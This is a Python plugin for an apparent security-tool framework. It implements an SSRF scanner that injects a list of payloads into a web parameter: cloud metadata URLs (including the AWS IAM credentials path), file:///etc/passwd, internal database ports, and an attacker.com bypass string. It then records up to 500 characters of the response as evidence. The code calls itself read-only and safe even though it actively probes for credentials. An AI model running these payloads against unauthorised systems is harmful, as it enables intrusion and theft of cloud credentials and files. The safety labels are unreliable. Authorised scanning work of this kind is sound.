from typing import Any, Dict
from cyber_tools import CyberToolPlugin, RiskLevel
import requests
import urllib.parse


class SSRFScannerTool(CyberToolPlugin):
    """SSRF (Server-Side Request Forgery) vulnerability scanner - READ_ONLY probe."""
    name = "ssrf_scanner"
    description = "Test for SSRF via URL parameter payloads (read-only, uses safe targets)"
    version = "1.0.0"
    environments = ["cross_platform"]
    requires_admin = False
    risk_level = RiskLevel.READ_ONLY

    # Safe SSRF test targets - these are safe to probe
    TEST_TARGETS = [
        # Localhost / internal
        ("http://127.0.0.1", "localhost"),
        ("http://localhost", "localhost"),
        ("http://127.0.0.1:80", "localhost_port"),
        ("http://127.0.0.1:8080", "localhost_alt_port"),
        ("http://169.254.169.254", "aws_metadata"),  # AWS metadata (safe - just checks reachability)
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata_path"),
        ("http://metadata.google.internal", "gcp_metadata"),
        ("http://169.254.169.254/metadata/v1/", "digitalocean_metadata"),
        ("http://127.0.0.1:22", "ssh_port"),
        ("http://127.0.0.1:3306", "mysql_port"),
        ("http://127.0.0.1:5432", "postgres_port"),
        ("http://127.0.0.1:6379", "redis_port"),
        ("http://127.0.0.1:27017", "mongodb_port"),
        # File protocol
        ("file:///etc/passwd", "file_protocol"),
        ("file:///c:/windows/win.ini", "file_protocol_windows"),
        # Cloud metadata with path traversal
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam_creds"),
        # Redirect-based
        ("http://127.0.0.1@attacker.com", "auth_bypass"),
    ]

    def run(self, arguments: Dict[str, Any]) -> Dict[str, Any]:
        url = arguments.get("url", "")
        method = arguments.get("method", "GET").upper()
        param = arguments.get("param", "url")
        headers = arguments.get("headers", {})
        timeout = arguments.get("timeout", 10)
        custom_targets = arguments.get("targets", None)
        follow_redirects = arguments.get("follow_redirects", False)

        if not url:
            return {"success": False, "output": {}, "error": "Missing 'url' argument."}

        test_targets = custom_targets or [t[0] for t in self.TEST_TARGETS]
        target_names = {t[0]: t[1] for t in self.TEST_TARGETS}
        if custom_targets:
            for t in custom_targets:
                target_names[t] = "custom"

        findings = []

        try:
            baseline = self._send_request(url, method, param, "http://example.com", headers, timeout, follow_redirects)
            baseline_len = len(baseline.get("body", ""))
            baseline_status = baseline.get("status_code", 0)

            for target in test_targets:
                encoded = urllib.parse.quote(target) if method == "GET" else target
                result = self._send_request(url, method, param, encoded, headers, timeout, follow_redirects)

                # Check for successful internal request
                status = result.get("status_code", 0)
                body = result.get("body", "")
                response_time = result.get("response_time", 0)

                # Indicators of successful SSRF
                indicators = []

                # 1. Different response than baseline (internal service responded)
                if status != baseline_status and status != 0:
                    indicators.append(f"Status code changed: {baseline_status} -> {status}")

                # 2. Response contains internal service indicators
                internal_indicators = [
                    "meta-data", "ami-id", "instance-id", "local-ipv4", "public-ipv4",  # AWS
                    "project-id", "numeric-project-id", "instance-name",  # GCP
                    "droplet-id", "vpc-id",  # DigitalOcean
                    "root:x:", "daemon:", "bin:", "sys:",  # /etc/passwd
                    "for 16-bit app support", "[fonts]", "[extensions]",  # win.ini
                    "redis_version", "redis_mode", "role:", "master_replid",  # Redis
                    "mysql_native_password", "caching_sha2_password",  # MySQL
                    "postgresql", "PG::",  # PostgreSQL
                    "SSH-", "OpenSSH",  # SSH
                    "mongodb", "MongoDB",  # MongoDB
                ]
                
                for indicator in internal_indicators:
                    if indicator.lower() in body.lower():
                        indicators.append(f"Internal content indicator: {indicator}")

                # 3. Fast response from internal IP (no external DNS/routing delay)
                if response_time < 0.5 and status == 200:
                    indicators.append(f"Fast internal response: {response_time:.3f}s")

                # 4. Content length significantly different
                if abs(len(body) - baseline_len) > 100:
                    indicators.append(f"Content length diff: {baseline_len} -> {len(body)}")

                if indicators:
                    findings.append({
                        "target": target,
                        "target_type": target_names.get(target, "unknown"),
                        "injected_url": target,
                        "status_code": status,
                        "response_time": response_time,
                        "content_length": len(body),
                        "indicators": indicators,
                        "evidence": body[:500] if body else None
                    })

            return {
                "success": True,
                "output": {
                    "url": url,
                    "method": method,
                    "param": param,
                    "targets_tested": len(test_targets),
                    "vulnerable": len(findings) > 0,
                    "findings": findings,
                    "baseline": {"status": baseline_status, "length": baseline_len}
                },
                "error": ""
            }
        except Exception as exc:
            return {"success": False, "output": {}, "error": str(exc)}

    def _send_request(self, url: str, method: str, param: str, value: str, headers: Dict, timeout: int, follow_redirects: bool) -> Dict:
        import time
        start = time.time()
        try:
            if method == "GET":
                resp = requests.get(url, params={param: value}, headers=headers, timeout=timeout, allow_redirects=follow_redirects)
            else:
                resp = requests.post(url, data={param: value}, headers=headers, timeout=timeout, allow_redirects=follow_redirects)
            return {
                "status_code": resp.status_code,
                "response_time": time.time() - start,
                "body": resp.text,
                "headers": dict(resp.headers)
            }
        except requests.Timeout:
            return {"status_code": 0, "response_time": timeout, "body": "", "error": "timeout"}
        except requests.ConnectionError:
            return {"status_code": 0, "response_time": time.time() - start, "body": "", "error": "connection_error"}
        except Exception as e:
            return {"status_code": 0, "response_time": time.time() - start, "body": "", "error": str(e)}


TOOL_CLASS = SSRFScannerTool